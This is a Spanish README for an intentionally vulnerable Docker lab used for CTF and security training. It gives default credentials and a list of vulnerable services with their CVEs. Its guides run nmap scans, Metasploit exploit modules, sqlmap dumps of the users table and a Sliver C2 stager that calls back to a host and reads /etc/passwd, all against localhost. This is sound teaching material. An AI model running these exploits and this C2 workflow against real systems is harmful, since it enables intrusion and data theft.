# MetaIsplotableX ARM64 — Docker Lab

> ⚠️ **WARNING**: This container exposes **intentionally vulnerable** services.
> Use **EXCLUSIVELY** on isolated private networks for educational and CTF purposes.
> **NEVER expose to the internet or production networks.**

[![Docker Build](https://github.com/statick88/metaisplotablex-arm/actions/workflows/docker-build.yml/badge.svg)](https://github.com/statick88/metaisplotablex-arm/actions/workflows/docker-build.yml)
[![Tests](https://github.com/statick88/metaisplotablex-arm/actions/workflows/tests.yml/badge.svg)](https://github.com/statick88/metaisplotablex-arm/actions/workflows/tests.yml)
[![Docker Pulls](https://img.shields.io/docker/pulls/statick/metaisplotablex-arm.svg)](https://hub.docker.com/r/statick/metaisplotablex-arm)

---

## Repositorios

- **GitHub**: https://github.com/statick88/metaisplotablex-arm
- **Docker Hub**: https://hub.docker.com/r/statick/metaisplotablex-arm
- **Imagen**: `statick/metaisplotablex-arm:latest`

---

## Quick Start

### Usar imagen Docker Hub (recomendado)
```bash
docker pull statick/metaisplotablex-arm:latest
```

### Levantar solo DVWA (lab principal funcional)
```bash
# Clonar repo
git clone https://github.com/statick88/metaisplotablex-arm.git
cd metaisplotablex-arm

# Levantar DVWA
docker compose up -d

# Verificar
docker compose ps
```

### Acceder
- **DVWA**: http://localhost:8080/dvwa/
- **SSH**: `ssh msfadmin@localhost -p 2222` (password: `msfadmin`)
- **MariaDB**: `localhost:3306` (user: `root`, sin password)

---

## Menú Interactivo

```bash
./menu.sh
```

Opciones:
1. Levantar stack completo (DVWA)
2. Apagar stack completo
3. Ver estado
4. Gestionar laboratorio individual (próximamente: WebGoat, JuiceShop, Ghost, bWAPP)
5. Guía rápida de herramientas (nmap, metasploit, sqlmap, sliver)
0. Salir

---

## Guías por Herramienta

### Nmap — Escaneo de puertos y servicios

```bash
# Escaneo rápido puertos principales del lab
nmap -sV -p 8080,2121,3306,6379,6667,8009 localhost

# Detección de versiones
nmap -sV -p 1-1000 localhost

# Escaneo completo
nmap -p- --min-rate 1000 localhost

# Scripts NSE para web
nmap --script=http-enum,http-headers,http-methods -p 8080 localhost

# SYN scan (stealth)
nmap -sS -p 8080,3306 localhost
```

---

### Metasploit Framework — Explotación de CVEs

```bash
# Iniciar msfconsole
msfconsole

# Tomcat Ghostcat (CVE-2020-1938)
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS localhost
set RPORT 8009
run

# Log4Shell (CVE-2021-44228)
use exploit/multi/http/log4shell_header_injection
set RHOSTS localhost
set RPORT 8080
set TARGETURI /log4shell
run

# SambaCry (CVE-2017-7494)
use exploit/linux/samba/is_known_pipename
set RHOSTS localhost
set RPORT 445
run

# ProFTPd mod_copy (CVE-2015-3306)
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS localhost
set RPORT 2121
run
```

---

### SQLMap — Inyección SQL en DVWA

```bash
# Detectar SQLi GET
sqlmap -u 'http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='PHPSESSID=xxx; security=low' --batch

# Enumerar bases de datos
sqlmap -u 'http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='PHPSESSID=xxx; security=low' --dbs --batch

# Dump de tabla users
sqlmap -u 'http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='PHPSESSID=xxx; security=low' -D dvwa -T users --dump --batch

# POST injection
sqlmap -u 'http://localhost:8080/dvwa/vulnerabilities/sqli/' \
  --data='id=1&Submit=Submit' --cookie='PHPSESSID=xxx; security=low' --batch
```

> **Nota**: Reemplazar `PHPSESSID=xxx` con la cookie de sesión actual de DVWA.

---

### Sliver — C2 Post-Explotación

```bash
# Servidor (Kali/attacker)
sliver-server

# Cliente
sliver-client

# Generar stager para el lab
generate --http 172.20.0.1:8080 --save /tmp/sliver.bin

# Ejecutar en contenedor
docker exec -it metaisplotablex /bin/bash
chmod +x /tmp/sliver.bin && /tmp/sliver.bin

# En sliver-client
jobs
use <session-id>
ls
cat /etc/passwd
whoami
```

> ⚠️ **USO SOLO EN LAB AISLADO**. No exponer Sliver a internet.

---

## Vulnerabilidades Disponibles

| Puerto | Servicio | CVE | Severidad |
|--------|----------|-----|-----------|
| 21 | ProFTPd | CVE-2015-3306 | CRITICAL |
| 80 | Apache 2 | CVE-2024-38474 | CRITICAL |
| 80 | Apache 2 | CVE-2014-6271 | CRITICAL |
| 80 | PHP-CGI | CVE-2012-1823 | CRITICAL |
| 80 | DVWA | — | SQLi, XSS, CSRF, File Upload, Command Injection |
| 139/445 | Samba | CVE-2017-7494 | CRITICAL |
| 2121 | ProFTPd | CVE-2015-3306 | CRITICAL |
| 3306 | MariaDB | CVE-2021-27928 | HIGH |
| 6200 | Backdoor | CVE-2011-2523 | CRITICAL |
| 6379 | Redis | CVE-2022-0543 | CRITICAL |
| 6667 | UnrealIRCd | CVE-2010-2075 | CRITICAL |
| 8009 | Tomcat AJP | CVE-2020-1938 | CRITICAL |
| 8080 | Tomcat 9 | CVE-2025-24813 | CRITICAL |
| 8080 | Tomcat 9 | CVE-2021-44228 | CRITICAL |
| 8585 | Apache | PHP RCE shell | — |

---

## Credenciales

| Usuario | Password | Acceso |
|---------|----------|--------|
| root | (vacío) | SSH (puerto 2222) |
| msfadmin | msfadmin | SSH (puerto 2222) |
| tomcat | tomcat | Tomcat Manager (8080/manager/html) |
| root | (vacío) | MariaDB (3306) |

---

## Labs Futuros

| Lab | Estado | Imagen |
|-----|--------|--------|
| DVWA | **ACTIVO** | metasploitable3-arm:latest |
| WebGoat | Próximamente | webgoat/webgoat-8.0:latest |
| Juice Shop | Próximamente | bkimminich/juice-shop:latest |
| Ghost | Próximamente | ghost:alpine |
| bWAPP | Próximamente | raesene/bwapp:latest |

---

## Tests

```bash
# Instalar dependencias
python3 -m venv .venv
source .venv/bin/activate
pip install -e ".[test]"

# Levantar stack
docker compose up -d
sleep 60

# Ejecutar tests
pytest tests/ -v
```

---

## Licencia

Uso educativo exclusivo. Labs diseñados para entornos aislados de práctica de seguridad ofensiva.

**Autor**: Diego Medardo Saavedra García  
**Organización**: Gentleman Programming / Universidad Nacional de Loja (UNL)
